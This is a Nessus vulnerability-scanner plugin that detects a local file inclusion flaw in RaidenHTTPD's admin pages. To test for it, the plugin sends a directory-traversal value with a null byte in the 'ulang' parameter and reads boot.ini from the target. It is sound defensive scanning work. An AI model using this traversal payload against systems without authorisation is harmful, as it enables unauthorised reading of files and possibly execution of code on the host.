#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");

if (description)
{
  script_id(29728);
  script_version("$Revision: 1.16 $");

  script_cve_id("CVE-2007-6453");
  script_bugtraq_id(26903,35781);
  script_osvdb_id(39228);
  script_xref(name:"Secunia", value:"35963");

  script_name(english:"RaidenHTTPD workspace.php ulang Parameter Local File Inclusion");
  script_summary(english:"Tries to read a local file with RaidenHTTPD");
 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP script that is 
susceptible to a local file include attack." );
 script_set_attribute(attribute:"description", value:
"The remote host is running RaidenHTTPD, a web server for 
Windows.

The version of RaidenHTTPD installed on the remote host 
fails to sanitize user-supplied input to the 'ulang' 
parameter in scripts '/raidenhttpd-admin/workspace.php' and 
'/raidenhttpd-admin/menu.php' before using it to include 
PHP code.  Provided the server's WebAdmin feature has been 
enabled, an unauthenticated, remote attacker can leverage 
this issue to view arbitrary files or to execute arbitrary 
PHP code on the remote host, subject to the privileges 
under which the server operates, which is SYSTEM by default." );
 # https://web.archive.org/web/20120119190929/http://retrogod.altervista.org/rgod_raidenhttpdudo.html
 script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?4c77cd3d" );
 script_set_attribute(attribute:"see_also", value:"http://www.securityfocus.com/archive/1/485221/30/0/threaded" );
 script_set_attribute(attribute:"see_also", value:"http://raidenhttpd.com/changelog.txt" );
 script_set_attribute(attribute:"solution", value:
"Upgrade to RaidenHTTPD Server 2.0.27 or later." );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:M/Au:N/C:C/I:C/A:C");
 script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:C");
 script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
 script_set_attribute(attribute:"exploit_available", value:"true");
 script_cwe_id(22);

 script_set_attribute(attribute:"plugin_publication_date", value: "2007/12/19");
 script_cvs_date("$Date: 2017/04/25 20:29:05 $");
script_set_attribute(attribute:"plugin_type", value:"remote");
script_set_attribute(attribute:"cpe", value:"cpe:/a:raiden_professional_servers:raidenhttpd");
script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();


  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2007-2017 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl");
  script_require_ports("Services/www", 80);

  exit(0);
}

include("global_settings.inc");
include("misc_func.inc");
include("http.inc");

port = get_http_port(default:80);

# Unless we're paranoid, make sure the banner indicates it's RaidenHTTPD.
if (report_paranoia < 2)
{
  banner = get_http_banner(port:port);
  if (!banner) exit(1, "No HTTP banner on port "+port);
  if ("Server: RaidenHTTPD" >!< banner) 
    exit(0, "RaidenHTTPD not found in banner on port "+port);
}

# Try to retrieve a local file.
file = "..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\boot.ini";

res = http_send_recv3(method:"GET",
        item:string("/raidenhttpd-admin/workspace.php?ulang=", file, "%00"),
        port:port);

if(isnull(res[2]))
res = http_send_recv3(method:"GET",
         item:string("/raidenhttpd-admin/menu.php?ulang=", file, "%00"),
         port:port);

if(isnull(res[2])) exit(0);

# There's a problem if looks like boot.ini.
if ("[boot loader]" >< res[2])
{
  if (report_verbosity > 0)
  {
    contents = res[2];
    if ("<center>" >< res[2]) contents = strstr(contents, "<center>") - "<center>";
    if ("<table" >< res[2]) contents = contents - strstr(contents, "<table");
    if ("[boot loader]" >!< contents) contents = res[2];

    report = string(
      "\n",
      "Here are the contents of the file '\\boot.ini' that Nessus was able to\n",
      "read from the remote host :\n",
      "\n",
      contents
    );
    security_hole(port:port, extra:report);
  }
  else 
    security_hole(port);
}
